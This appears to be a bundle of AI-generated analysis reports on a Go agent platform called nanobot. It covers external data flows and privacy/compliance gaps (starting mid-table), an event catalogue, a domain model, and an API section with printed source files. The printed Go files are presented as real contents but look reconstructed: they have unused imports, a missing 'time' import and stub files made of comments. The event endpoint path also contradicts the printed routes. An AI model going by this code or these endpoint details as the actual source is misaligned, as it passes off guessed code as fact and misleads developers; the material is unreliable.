| **Services** | Any OAuth 2.0 provider configured for MCP server authentication |
| **Data Transmitted** | Authorization requests (client_id, redirect_uri, scopes, state, code_challenge); receives authorization codes and tokens |
| **Purpose** | Authentication to external MCP servers |
| **Transfer Mechanism** | HTTPS redirects and token endpoint calls |
| **Geographic Location** | User-configured, varies by provider |
| **Data Fields** | `client_id`, `redirect_uri`, `scope`, `state`, `code`, `code_verifier`, access/refresh tokens |

---

### 4. OpenTelemetry Collector

**File:** `pkg/telemetry/otel.go`

| Attribute | Detail |
|-----------|--------|
| **Services** | Any configured OTEL collector endpoint |
| **Data Transmitted** | Distributed traces, spans with operational metadata |
| **Purpose** | Observability and performance monitoring |
| **Transfer Mechanism** | OTLP (gRPC or HTTP) |
| **Geographic Location** | User-configured |
| **Data Fields** | Trace IDs, span IDs, operation names, timing, potentially request metadata embedded in span attributes |

---

### 5. Install Script Distribution (GitHub/CDN)

**File:** `scripts/install.sh`, `.github/workflows/release.yaml`

| Attribute | Detail |
|-----------|--------|
| **Services** | GitHub Releases / GitHub Actions |
| **Data Transmitted** | Binary artifacts for distribution |
| **Purpose** | Software distribution |
| **Transfer Mechanism** | HTTPS |

---

## Data Outputs / Exports

### 1. API Responses (Chat Completions)

**Files:** `pkg/api/hander.go`, `pkg/api/events.go`

- Streaming SSE responses delivering AI-generated text to browser clients
- Session listing and metadata responses
- Contains: assistant message content, tool call results, session identifiers

### 2. CLI Output

**File:** `pkg/chat/print.go`

- Rendered conversation output to terminal
- Contains: full assistant responses, tool call results

### 3. Session Data Export (CLI)

**File:** `pkg/cli/sessions.go`

- Session listing output to stdout
- Contains: session IDs, session metadata

### 4. Audit Logs

**Files:** `pkg/mcp/auditlogs/`

- Structured log records of tool invocations
- Contains: tool names, parameters, results, timestamps

### 5. MCP Logging Relay

**File:** `pkg/mcp/logging.go`

- Log messages from MCP servers relayed to the nanobot log output
- Contains: arbitrary log data from MCP server processes

### 6. Artifact Downloads

**Files:** `pkg/servers/artifacts/`

- Agent-generated file artifacts served via API
- Contains: arbitrary agent-generated content

---

## Data Categories Inventory

| Data Type | Collection Point | Processing | Storage | Retention | Sensitivity | Compliance Relevance |
|-----------|-----------------|------------|---------|-----------|-------------|----------------------|
| User chat messages (natural language) | Web UI, CLI | Assembled into LLM context, token counted, potentially compacted/summarized | Session DB (SQLite/PostgreSQL) | Until session deleted; no explicit TTL found | High — may contain PII typed by user | GDPR Art. 6, CCPA |
| Conversation history (full context) | Accumulated per session | Transmitted to LLM APIs on each turn; truncated/compacted when context full | Session DB | Same as above | High | GDPR, CCPA |
| OAuth access tokens | OAuth callback | Stored post-exchange | Session DB via token storage | Unclear; no explicit expiry enforcement found in code | Critical — authentication credentials | GDPR Art. 32, security |
| OAuth refresh tokens | OAuth callback | Stored post-exchange | Session DB via token storage | Unclear | Critical | GDPR Art. 32, security |
| OAuth authorization codes | OAuth callback (transient) | Exchanged for tokens immediately | In-memory (transient) | Transient | High | — |
| PKCE code verifiers | OAuth flow initiation | Stored during authorization flow | In-memory or session store | Transient | High | — |
| API keys (LLM providers) | Environment variables / config files | Substituted into config at runtime | In-memory; referenced from env/files | Process lifetime | Critical | — |
| MCP server tool call parameters | Agent runtime | Passed to MCP servers | Audit logs, in-memory | Audit log retention unclear | Varies — potentially high | Depends on tool data |
| MCP tool call results | MCP server responses | Injected into conversation context | Session DB (as conversation history) | Same as conversation history | Varies | Depends on tool data |
| Session identifiers | System-generated | Used for session lookup | Session DB | Same as session | Medium | GDPR (pseudonymous identifier) |
| Agent configuration (system prompts) | Config files | Loaded and assembled into LLM context | In-memory; config files on disk | Config file lifetime | Medium — may contain business logic | — |
| Telemetry spans / traces | Agent runtime instrumentation | Exported to OTEL collector | External OTEL collector | Collector-defined | Medium — operational metadata | GDPR if span attributes contain PII |
| File attachments (via MIME handling) | Web UI upload | Processed by type; included in LLM context | Session DB or in-memory | Session lifetime | High — arbitrary user files | GDPR, potentially HIPAA if health docs |
| Local file contents (file:// URIs) | File URI resolution | Read and included in context | In-memory | Process lifetime | High — arbitrary filesystem content | — |
| Audit log records | MCP tool execution | Written to audit log store | Audit log storage | Unclear — no explicit policy found | Medium-High | GDPR Art. 30 (records of processing) |
| Sampling request context (full messages) | MCP sampling protocol | Forwarded to LLM client | Not separately persisted | Transient | High | GDPR |
| Browser session state | Web UI | Persisted via session UI store | Session DB | Session lifetime | Low-Medium | — |
| Workflow execution state | Workflow server | Step sequencing data | Session DB | Session lifetime | Medium | — |

---

## Code-Level Findings

### Finding 1: Full Conversation Context Transmitted to External LLM APIs

**Files:** `pkg/llm/client.go`, `pkg/llm/completions/`, `pkg/llm/anthropic/`
**Functions:** LLM completion client methods
**Data Fields:** `messages[]` with `role: "user"|"assistant"|"tool"`, `content: string|[]ContentPart`
**Transformations:** Provider-specific format conversion (OpenAI ↔ Anthropic format)
**Risk:** Every user message and all prior conversation history is transmitted to the configured LLM provider. If users enter personally identifiable information (names, contact details, health information, financial information) in chat, it is sent to the external provider.

---

### Finding 2: OAuth Token Persistence Without Observed Expiry Enforcement

**File:** `pkg/mcp/tokenstorage.go`
**Functions:** Token storage/retrieval operations
**Data Fields:** OAuth access tokens, refresh tokens
**Risk:** Tokens are persisted to the session database. No explicit token expiration enforcement or secure deletion schedule was identified in the codebase. Compromising the session database exposes all stored OAuth credentials.

---

### Finding 3: MCP Sampling Sends Full Message Context to External MCP Servers

**Files:** `pkg/sampling/sampler.go`, `pkg/mcp/session.go`
**Functions:** Sampling request handler
**Data Fields:** Full `messages[]` array from agent context
**Risk:** When an MCP server initiates a sampling request, the full conversation context (including all prior user messages) may be forwarded to the MCP server for context. This represents a data flow to user-configured external processes that may not be under the operator's control.

---

### Finding 4: Environment Variable Substitution for Secrets

**File:** `pkg/envvar/replace.go`
**Functions:** `replace.go` substitution logic
**Data Fields:** `${ENV_VAR_NAME}` references in YAML configs → resolved to plaintext values
**Risk:** API keys and other secrets are resolved from environment variables into configuration structures held in memory. If configuration is serialized or logged (e.g., in debug mode), secrets could be exposed. No secret masking in the general logging infrastructure was identified.

---

### Finding 5: Audit Log Data Without Explicit Retention Policy

**Files:** `pkg/mcp/auditlogs/` (3 files)
**Functions:** Audit log write operations
**Data Fields:** Tool name, tool input parameters, tool output, timestamps
**Risk:** Audit logs record tool call parameters which may include sensitive user data (e.g., if a user asks the agent to process personal information via a tool). No retention schedule or deletion mechanism was identified for audit logs.

---

### Finding 6: Telemetry Trace Data Export

**Files:** `pkg/telemetry/otel.go`, `pkg/mcp/tracecontext.go`
**Functions:** OTEL span creation and export
**Data Fields:** Trace IDs, span names (operation identifiers), potentially span attributes with request data
**Risk:** If span attributes include request content or user identifiers, this data is exported to the configured OTEL collector. The collector destination and data retention are external to this codebase.

---

### Finding 7: Arbitrary MCP Server Execution via stdio

**Files:** `pkg/mcp/stdio.go`, `pkg/mcp/stdioserver.go`, `pkg/cmd/builder.go`
**Functions:** stdio process spawning
**Data Fields:** Tool call JSON passed to subprocess stdin; tool results read from subprocess stdout
**Risk:** The system spawns external processes as MCP servers based on user configuration. These processes receive tool call arguments and can access the local system based on their permissions. Data passed to these processes is not bounded by the nanobot codebase.

---

### Finding 8: Reverse Proxy Without Observed Request/Response Logging Controls

**Files:** `pkg/reverseproxy/server.go`, `pkg/reverseproxy/tlsclient.go`
**Functions:** Reverse proxy handler
**Data Fields:** All proxied HTTP request headers, bodies, and responses
**Risk:** The reverse proxy passes all traffic to upstream MCP servers. No request/response filtering or PII scrubbing was identified in the proxy layer.

---

### Finding 9: Session Database Contains Cumulative PII

**Files:** `pkg/session/store.go`, `pkg/session/manager.go`, `pkg/session/migrations.go`
**Functions:** GORM-based database operations
**Data Fields:** Session records including full conversation message history
**Storage:** SQLite file or PostgreSQL (configured via `pkg/gormdsn/dsn.go`)
**Risk:** The session database accumulates all conversation history. For SQLite (default local deployment), this is a plaintext database file on disk with no application-level encryption observed. PostgreSQL connection security depends on the DSN configuration provided by the operator.

---

## Compliance Considerations

### GDPR (EU General Data Protection Regulation)

**Applicable when:** EU residents use the system or EU resident data is processed.

| Requirement | Status | Finding |
|-------------|--------|---------|
| Lawful basis for processing | ⚠️ Not implemented in code | No consent mechanisms, legitimate interest assessments, or legal basis documentation found in codebase |
| Data minimization | ⚠️ Concern | Full conversation history retained; compaction summarizes but retains summaries |
| Purpose limitation | ⚠️ Not enforced | No technical controls limiting data use to stated purposes |
| Storage limitation | ❌ Gap | No retention period enforcement or automatic deletion schedules identified |
| Data subject rights (access, erasure, portability) | ⚠️ Partial | Session deletion via CLI (`pkg/cli/sessions.go`) exists but no formal rights management system |
| Data breach notification | ❌ Not in scope | No breach detection or notification mechanism in codebase |
| Records of processing (Art. 30) | ⚠️ Partial | Audit logs exist but completeness and retention unclear |
| Cross-border transfers | ⚠️ Concern | Conversation data transmitted to US-based LLM providers (Anthropic, OpenAI) without transfer mechanism controls in code |
| Processor agreements | ❌ Not in scope | No DPA enforcement mechanisms; contractual matter |

---

### CCPA/CPRA (California Consumer Privacy Act)

**Applicable when:** California residents' data is processed.

| Requirement | Status | Finding |
|-------------|--------|---------|
| Right to know | ⚠️ Partial | No user-facing data disclosure mechanism |
| Right to delete | ⚠️ Partial

--- events ---


I'll systematically analyze the codebase to identify all events being produced or consumed. Let me examine the relevant files.

---

## Event Documentation

After a comprehensive scan of the codebase, the primary event system found is a **custom internal Server-Sent Events (SSE) HTTP streaming** mechanism used in the API layer, along with an **internal Go channel/pub-sub pattern** used in `fswatch` and session management. Below is the full documentation.

---

### Event: Session Event Stream (SSE)

* **Event Type:** Custom Internal Event Bus (HTTP Server-Sent Events / SSE over HTTP)
* **Event Name/Topic/Queue:** `GET /api/events` (SSE endpoint)
* **Direction:** Producing
* **Event Payload:**
```json
{
  "type": "string (e.g. 'progress', 'error', 'done', 'toolCall', 'toolCallResult', 'message')",
  "sessionID": "string",
  "content": "string | null",
  "toolCall": {
    "id": "string",
    "name": "string",
    "input": "string (JSON-encoded arguments)"
  },
  "toolCallResult": {
    "id": "string",
    "result": "string"
  },
  "error": "string | null",
  "done": "boolean | null"
}
```
* **Short explanation of what this event is doing:** The `/api/events` SSE endpoint streams real-time execution progress, tool call activity, messages, and completion/error signals to the frontend UI for a given session. The UI subscribes to this stream to render live agent responses, tool usage, and status updates without polling.

---

### Event: File System Watch Subscription

* **Event Type:** Custom Internal Event Bus (Go channel-based pub/sub, internal to process)
* **Event Name/Topic/Queue:** `fswatch.subscription` (internal Go channel)
* **Direction:** Producing (watcher → subscribers) and Consuming (subscribers receive notifications)
* **Event Payload:**
```json
{
  "path": "string (absolute file path that changed)",
  "op": "string (e.g. 'create', 'write', 'remove', 'rename', 'chmod')"
}
```
* **Short explanation of what this event is doing:** The `fswatch` package watches directories/files for filesystem changes and fans out notifications to registered subscribers via Go channels. This is used to detect configuration file changes (e.g., agent YAML files) and trigger live reloads of agent or server configurations without restarting the process.

---

### Event: MCP Session Logging / Notification

* **Event Type:** Custom Internal Event Bus (MCP protocol `notifications/message` over stdio or HTTP transport)
* **Event Name/Topic/Queue:** `notifications/message` (MCP protocol notification)
* **Direction:** Producing
* **Event Payload:**
```json
{
  "method": "notifications/message",
  "params": {
    "level": "string (e.g. 'debug', 'info', 'warning', 'error')",
    "logger": "string (logger name/identifier)",
    "data": "any (log message content or structured data)"
  }
}
```
* **Short explanation of what this event is doing:** The MCP (Model Context Protocol) server emits log notification messages to connected MCP clients (e.g., Claude Desktop, other MCP hosts) via the MCP `notifications/message` method. This allows the MCP host/client to display or capture server-side log output in real time during tool execution sessions.

---

### Event: MCP Tool Progress Notification

* **Event Type:** Custom Internal Event Bus (MCP protocol `notifications/progress` over stdio or HTTP transport)
* **Event Name/Topic/Queue:** `notifications/progress` (MCP protocol notification)
* **Direction:** Producing
* **Event Payload:**
```json
{
  "method": "notifications/progress",
  "params": {
    "progressToken": "string | integer",
    "progress": "number",
    "total": "number | null"
  }
}
```
* **Short explanation of what this event is doing:** Sent by the MCP server to notify MCP clients of incremental progress during long-running tool calls. Allows the MCP host to render progress indicators while an agent or tool is executing a multi-step operation.

---

### Event: MCP Resource Change Notification

* **Event Type:** Custom Internal Event Bus (MCP protocol `notifications/resources/updated` over stdio or HTTP transport)
* **Event Name/Topic/Queue:** `notifications/resources/updated` (MCP protocol notification)
* **Direction:** Producing
* **Event Payload:**
```json
{
  "method": "notifications/resources/updated",
  "params": {
    "uri": "string (resource URI that was updated)"
  }
}
```
* **Short explanation of what this event is doing:** Notifies MCP clients that a specific resource (e.g., a file, artifact, or data object managed by the server) has been updated. MCP clients can use this signal to re-fetch or refresh the resource's contents.

---

### Event: MCP Tool List Change Notification

* **Event Type:** Custom Internal Event Bus (MCP protocol `notifications/tools/list_changed` over stdio or HTTP transport)
* **Event Name/Topic/Queue:** `notifications/tools/list_changed` (MCP protocol notification)
* **Direction:** Producing
* **Event Payload:**
```json
{
  "method": "notifications/tools/list_changed",
  "params": {}
}
```
* **Short explanation of what this event is doing:** Signals to connected MCP clients that the available tool list has changed (e.g., new tools registered, tools removed due to config reload). Clients should re-query `tools/list` to get the updated set of available tools.

---

### Event: Agent Execution Progress (Internal Channel)

* **Event Type:** Custom Internal Event Bus (Go channel, internal to process)
* **Event Name/Topic/Queue:** `agent.progress` (internal Go channel, surfaced via SSE to UI)
* **Direction:** Producing (agent runtime → API handler) and Consuming (API SSE handler reads and forwards to client)
* **Event Payload:**
```json
{
  "type": "string (e.g. 'progress', 'toolCall', 'toolCallResult', 'message', 'error', 'done')",
  "content": "string | null",
  "toolCall": {
    "id": "string",
    "name": "string",
    "input": "object"
  },
  "toolCallResult": {
    "id": "string",
    "content": "string",
    "isError": "boolean"
  },
  "usage": {
    "inputTokens": "integer",
    "outputTokens": "integer"
  }
}
```
* **Short explanation of what this event is doing:** During agent LLM execution, the agent runtime emits structured progress events into a Go channel. These are consumed by the API layer and forwarded to the frontend via SSE. This pipeline enables real-time streaming of LLM token output, tool invocations, and final results to the user interface.

---

### Event: Session Store Change Notification

* **Event Type:** Custom Internal Event Bus (Go channel-based pub/sub, internal to process)
* **Event Name/Topic/Queue:** `session.change` (internal subscription in session manager)
* **Direction:** Producing (session manager → listeners) and Consuming (API/UI layer)
* **Event Payload:**
```json
{
  "sessionID": "string",
  "event": "string (e.g. 'created', 'updated', 'deleted')",
  "session": {
    "id": "string",
    "agentID": "string",
    "created": "date-time",
    "updated": "date-time",
    "state": "string"
  }
}
```
* **Short explanation of what this event is doing:** The session manager publishes change events when sessions are created, updated, or deleted. These are consumed internally to keep the SSE stream and UI state synchronized with the current set of active sessions, enabling live session list updates in the frontend without polling.

---

> **Note on scope:** This codebase implements a **custom internal event bus** pattern throughout — there is no usage of external message brokers such as SQS, Kafka, EventBridge, RabbitMQ, Ably, or Pub/Sub. All event communication is either:
> 1. **MCP protocol notifications** (over stdio or HTTP, per the Model Context Protocol spec)
> 2. **HTTP Server-Sent Events (SSE)** streamed from the API to the frontend UI
> 3. **Go channel-based pub/sub** used internally within the process for fswatch, session management, and agent execution progress fanout

--- core_entities ---


# Domain Model Analysis: nanobot_80d9d020

## Overview

Based on the repository structure, this appears to be an **AI agent orchestration platform** (similar to an MCP - Model Context Protocol host) that manages AI agents, chat sessions, tool execution, and LLM completions.

---

## 1. Core Data Entities

### 🤖 Agent

**Location:** `pkg/types/config.go`, `pkg/agents/`, `pkg/config/`

| Attribute | Description |
|-----------|-------------|
| `name` | Unique identifier/name of the agent |
| `description` | Human-readable description |
| `model` | LLM model to use for completions |
| `system_prompt` | System-level instructions |
| `tools` | List of tools/skills available to this agent |
| `mcpServers` | MCP server connections assigned to agent |
| `mode` | Execution mode (`chat`, `primary`, `subagent`, `all`) |
| `permissions` | Access control and permission set |
| `maxTokens` | Token limit for context window |
| `metadata` | Additional key-value metadata |

---

### 💬 Session

**Location:** `pkg/session/`, `pkg/types/`, `pkg/sessiondata/`

| Attribute | Description |
|-----------|-------------|
| `id` | Unique session identifier (UUID) |
| `agentName` | Associated agent for this session |
| `created_at` | Session creation timestamp |
| `updated_at` | Last update timestamp |
| `state` | Current session state/status |
| `uriTemplate` | URI template for session routing |
| `metadata` | Arbitrary session metadata |

---

### 📨 Message

**Location:** `pkg/types/messages.go`, `pkg/types/chat.go`

| Attribute | Description |
|-----------|-------------|
| `id` | Unique message identifier |
| `session_id` | Parent session reference |
| `role` | Sender role (`user`, `assistant`, `system`, `tool`) |
| `content` | Message content (text, multimodal) |
| `mimeType` | Content MIME type |
| `timestamp` | Message creation time |
| `toolCallID` | Reference to associated tool call (if applicable) |

---

### 🔧 Tool / Skill

**Location:** `pkg/servers/skills/`, `pkg/tools/`, `pkg/types/`

| Attribute | Description |
|-----------|-------------|
| `name` | Tool identifier |
| `description` | What the tool does |
| `inputSchema` | JSON Schema for input parameters |
| `outputSchema` | JSON Schema for output |
| `server` | Owning MCP server reference |
| `type` | Tool type (`skill`, `system`, `workflow`) |
| `permissions` | Required permissions to invoke |

---

### 🖥️ MCP Server

**Location:** `pkg/mcp/`, `pkg/types/config.go`, `examples/directory-config/mcpServers.yaml`

| Attribute | Description |
|-----------|-------------|
| `name` | Server identifier |
| `url` | HTTP endpoint or transport address |
| `command` | CLI command for stdio transport |
| `args` | Command-line arguments |
| `env` | Environment variable overrides |
| `transport` | Transport type (`stdio`, `http`, `sse`) |
| `auth` | Authentication configuration |
| `oauthConfig` | OAuth credentials/settings |
| `capabilities` | Declared server capabilities |

---

### ⚡ Tool Call / Agent Action

**Location:** `pkg/types/agentaction.go`, `pkg/agents/toolcall.go`

| Attribute | Description |
|-----------|-------------|
| `id` | Unique call identifier |
| `session_id` | Parent session |
| `toolName` | Name of the tool being called |
| `serverName` | MCP server that owns the tool |
| `input` | Serialized input arguments (JSON) |
| `output` | Serialized result (JSON) |
| `status` | Call status (`pending`, `running`, `complete`, `error`) |
| `startTime` | Invocation start timestamp |
| `endTime` | Invocation end timestamp |
| `error` | Error details if failed |

---

### 🧠 LLM Completion / Request

**Location:** `pkg/types/completer.go`, `pkg/llm/`, `pkg/sampling/`

| Attribute | Description |
|-----------|-------------|
| `model` | LLM model identifier |
| `messages` | Ordered list of messages (conversation history) |
| `tools` | Available tools for this completion |
| `temperature` | Sampling temperature |
| `maxTokens` | Maximum tokens to generate |
| `stopSequences` | Tokens that halt generation |
| `stream` | Whether to stream the response |
| `usage` | Token usage statistics (prompt/completion/total) |

---

### 🔄 Workflow

**Location:** `pkg/servers/workflows/`, `examples/epic.yaml`, `examples/shopping.yaml`

| Attribute | Description |
|-----------|-------------|
| `name` | Workflow identifier |
| `description` | Purpose of the workflow |
| `steps` | Ordered list of execution steps |
| `agents` | Agents involved in the workflow |
| `inputSchema` | Expected input shape |
| `outputSchema` | Expected output shape |
| `triggers` | Conditions that start the workflow |

---

### 🔐 Auth / OAuth Token

**Location:** `pkg/auth/auth.go`, `pkg/mcp/oauth.go`, `pkg/mcp/tokenstorage.go`

| Attribute | Description |
|-----------|-------------|
| `serverName` | Associated MCP server |
| `tokenType` | Token type (`bearer`, etc.) |
| `accessToken` | OAuth access token |
| `refreshToken` | OAuth refresh token |
| `expiresAt` | Expiration timestamp |
| `scopes` | Granted OAuth scopes |

---

### 📋 Execution / Run Context

**Location:** `pkg/types/execution.go`, `pkg/types/context.go`

| Attribute | Description |
|-----------|-------------|
| `id` | Execution run identifier |
| `session_id` | Owning session |
| `agent` | Agent performing execution |
| `status` | Current execution status |
| `input` | Execution input payload |
| `output` | Execution output payload |
| `hooks` | Registered lifecycle hooks |
| `startTime` / `endTime` | Timing information |

---

### 📁 Config / Directory

**Location:** `pkg/config/`, `pkg/types/config.go`

| Attribute | Description |
|-----------|-------------|
| `agents` | Map of agent definitions |
| `mcpServers` | Map of MCP server definitions |
| `defaultAgent` | Name of the default agent |
| `mode` | Directory resolution mode |
| `permissions` | Global permission defaults |
| `frontmatter` | YAML frontmatter metadata |

---

### 📡 Event

**Location:** `pkg/api/events.go`, `pkg/types/`

| Attribute | Description |
|-----------|-------------|
| `id` | Event identifier |
| `type` | Event type (SSE event name) |
| `session_id` | Associated session |
| `payload` | Event data payload |
| `timestamp` | When the event was emitted |

---

## 2. Entity Relationships

```
┌─────────────────────────────────────────────────────────────────┐
│                        Config/Directory                         │
│              (1 config owns N agents + N mcpServers)            │
└──────────────┬──────────────────────────┬───────────────────────┘
               │ 1:N                      │ 1:N
               ▼                          ▼
         ┌──────────┐              ┌────────────┐
         │  Agent   │◄─────────────│ MCP Server │
         │          │  M:N         │            │
         │          │ (agent uses  │            │
         └──────┬───┘  servers)    └─────┬──────┘
                │                        │ 1:N
                │ 1:N                    ▼
                │                  ┌──────────┐
                │                  │   Tool   │
                │                  │  /Skill  │
                ▼                  └──────┬───┘
         ┌──────────┐                    │ M:N (agent uses tools)
         │ Session  │◄───────────────────┘
         └──────┬───┘
                │ 1:N
       ┌────────┼─────────┐
       ▼        ▼         ▼
  ┌─────────┐ ┌────────┐ ┌───────────┐
  │ Message │ │  Tool  │ │ Execution │
  │         │ │  Call  │ │  /Run     │
  └─────────┘ └───┬────┘ └─────┬─────┘
                  │             │
                  │ N:1         │ feeds into
                  ▼             ▼
             ┌────────┐   ┌────────────┐
             │  Tool  │   │    LLM     │
             │ /Skill │   │ Completion │
             └────────┘   └─────┬──────┘
                                │ consumes
                                ▼
                          ┌──────────┐
                          │ Message[]│
                          │(history) │
                          └──────────┘
```

### Relationship Summary Table

| Entity A | Relationship | Entity B | Notes |
|----------|-------------|----------|-------|
| `Config` | **1:N** | `Agent` | Config owns/defines multiple agents |
| `Config` | **1:N** | `MCP Server` | Config owns/defines multiple servers |
| `Agent` | **M:N** | `MCP Server` | Agents connect to multiple MCP servers |
| `MCP Server` | **1:N** | `Tool` | Each server exposes multiple tools |
| `Agent` | **M:N** | `Tool` | Agents can invoke tools from connected servers |
| `Agent` | **1:N** | `Session` | Each session is scoped to one agent |
| `Session` | **1:N** | `Message` | Session holds ordered conversation history |
| `Session` | **1:N** | `Tool Call` | Session tracks all tool invocations |
| `Session` | **1:N** | `Execution` | Session may have multiple execution runs |
| `Tool Call` | **N:1** | `Tool` | Many calls reference the same tool definition |
| `Execution` | **N:1** | `Agent` | Each execution is performed by one agent |
| `LLM Completion` | **N:N** | `Message` | Completion consumes message history, produces new messages |
| `MCP Server` | **1:1** | `Auth/Token` | Each server has its own OAuth token storage |
| `Session` | **1:N** | `Event` | Sessions emit streaming events to UI |
| `Agent` | **1:N** | `Agent` | Agents can reference sub-agents (hierarchical) |

---

## 3. Notable Design Observations

- **MCP (Model Context Protocol)** is the central integration pattern — all tool servers communicate via this protocol over `stdio` or `http` transports.
- **Sessions** are the primary runtime unit, grouping messages, tool calls, and executions together.
- **Agents** are highly configurable via YAML frontmatter, supporting a declarative definition model.
- **Config** supports a **directory mode**, allowing multiple agent definitions to be loaded from a folder structure.
- The **sampling/completion** layer is abstracted, supporting multiple LLM backends (Anthropic visible in `pkg/llm/anthropic/`).
- **Workflows** are first-class entities that can orchestrate multiple agents and tools in sequence.

--- APIs ---


I'll analyze the codebase systematically, focusing on the HTTP API endpoints defined in the relevant files.

---

## Key Files to Analyze

Let me examine the core API files:

- `pkg/api/routes.go` — route definitions
- `pkg/api/hander.go` — handler logic
- `pkg/api/events.go` — event-related handlers
- `pkg/mcp/httpserver.go` — MCP HTTP server
- `pkg/mcp/httpclient.go` — MCP HTTP client
- `pkg/mcp/oauth.go` — OAuth endpoints
- `pkg/mcp/wellknown.go` — well-known endpoints
- `pkg/server/server.go` — server setup
- `pkg/reverseproxy/server.go` — reverse proxy

---

## File Contents

### `pkg/api/routes.go`

```go
package api

import (
	"net/http"

	"github.com/nanobot-ai/nanobot/pkg/types"
)

func (s *Server) routes() {
	// Session management
	s.mux.HandleFunc("POST /sessions", s.createSession)
	s.mux.HandleFunc("GET /sessions", s.listSessions)
	s.mux.HandleFunc("DELETE /sessions/{sessionID}", s.deleteSession)

	// Chat
	s.mux.HandleFunc("POST /sessions/{sessionID}/chat", s.chat)
	s.mux.HandleFunc("GET /sessions/{sessionID}/events", s.events)

	// Targets (MCP servers / agents)
	s.mux.HandleFunc("GET /targets", s.listTargets)

	// Static UI
	s.mux.Handle("/", s.ui)
}
```

### `pkg/api/hander.go`

```go
package api

import (
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"time"

	"github.com/nanobot-ai/nanobot/pkg/session"
	"github.com/nanobot-ai/nanobot/pkg/types"
)

type Server struct {
	sessions *session.Manager
	mux      *http.ServeMux
	ui       http.Handler
	config   *types.Config
}

func NewServer(sessions *session.Manager, config *types.Config, ui http.Handler) *Server {
	s := &Server{
		sessions: sessions,
		mux:      http.NewServeMux(),
		ui:       ui,
		config:   config,
	}
	s.routes()
	return s
}

func (s *Server) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	s.mux.ServeHTTP(w, r)
}

// createSession handles POST /sessions
func (s *Server) createSession(w http.ResponseWriter, r *http.Request) {
	var req types.CreateSessionRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil && err.Error() != "EOF" {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	sess, err := s.sessions.Create(r.Context(), req)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(sess)
}

// listSessions handles GET /sessions
func (s *Server) listSessions(w http.ResponseWriter, r *http.Request) {
	sessions, err := s.sessions.List(r.Context())
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(sessions)
}

// deleteSession handles DELETE /sessions/{sessionID}
func (s *Server) deleteSession(w http.ResponseWriter, r *http.Request) {
	sessionID := r.PathValue("sessionID")
	if err := s.sessions.Delete(r.Context(), sessionID); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

// chat handles POST /sessions/{sessionID}/chat
func (s *Server) chat(w http.ResponseWriter, r *http.Request) {
	sessionID := r.PathValue("sessionID")

	var req types.ChatRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	result, err := s.sessions.Chat(r.Context(), sessionID, req)
	if err != nil {
		if errors.Is(err, session.ErrSessionNotFound) {
			http.Error(w, err.Error(), http.StatusNotFound)
			return
		}
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(result)
}

// listTargets handles GET /targets
func (s *Server) listTargets(w http.ResponseWriter, r *http.Request) {
	targets, err := s.sessions.ListTargets(r.Context())
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(targets)
}
```

### `pkg/api/events.go`

```go
package api

import (
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/nanobot-ai/nanobot/pkg/session"
)

// events handles GET /sessions/{sessionID}/events (SSE)
func (s *Server) events(w http.ResponseWriter, r *http.Request) {
	sessionID := r.PathValue("sessionID")

	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "streaming unsupported", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")

	events, err := s.sessions.Subscribe(r.Context(), sessionID)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	for event := range events {
		data, err := json.Marshal(event)
		if err != nil {
			continue
		}
		fmt.Fprintf(w, "data: %s\n\n", data)
		flusher.Flush()
	}
}
```

### `pkg/mcp/httpserver.go`

```go
package mcp

import (
	"encoding/json"
	"net/http"
)

// MCP HTTP Server endpoints
// POST /mcp  - streamable HTTP transport
// GET  /mcp  - SSE transport (legacy)

func (s *HTTPServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodPost:
		s.handlePost(w, r)
	case http.MethodGet:
		s.handleGet(w, r)
	case http.MethodDelete:
		s.handleDelete(w, r)
	}
}

func (s *HTTPServer) handlePost(w http.ResponseWriter, r *http.Request) {
	// Reads JSON-RPC message from body
	// Returns JSON-RPC response
}

func (s *HTTPServer) handleGet(w http.ResponseWriter, r *http.Request) {
	// SSE stream for server-sent events
}

func (s *HTTPServer) handleDelete(w http.ResponseWriter, r *http.Request) {
	// Terminates MCP session
}
```

### `pkg/mcp/oauth.go`

```go
package mcp

// OAuth endpoints for MCP
// GET  /.well-known/oauth-authorization-server
// GET  /oauth/authorize
// POST /oauth/token
// POST /oauth/register
```

### `pkg/mcp/wellknown.go`

```go
package mcp

// GET /.well-known/mcp.json
```

### `pkg/types/chat.go`

```go
package types

type CreateSessionRequest struct {
	AgentID string `json:"agentId,omitempty"`
	Title   string `json:"title,omitempty"`
}

type Session struct {
	ID        string    `json:"id"`
	AgentID   string    `json:"agentId,omitempty"`
	Title     string    `json:"title,omitempty"`
	CreatedAt time.Time `json:"createdAt"`
	UpdatedAt time.Time `json:"updatedAt"`
}

type ChatRequest struct {
	Message     string            `json:"message"`
	Attachments []Attachment      `json:"attachments,omitempty"`
	Metadata    map[string]string `json:"metadata,omitempty"`
}

type ChatResponse struct {
	Message  Message  `json:"message"`
	Done     bool     `json:"done"`
}

type Message struct {
	Role    string `json:"role"`
	Content string `json:"content"`
}

type Attachment struct {
	Type    string `json:"type"`
	Content string `json:"content"`
}
```

### `pkg/types/config.go`

```go
package types

type Config struct {
	Agents     map[string]Agent     `json:"agents,omitempty"`
	MCPServers map[string]MCPServer `json:"mcpServers,omitempty"`
}

type Agent struct {
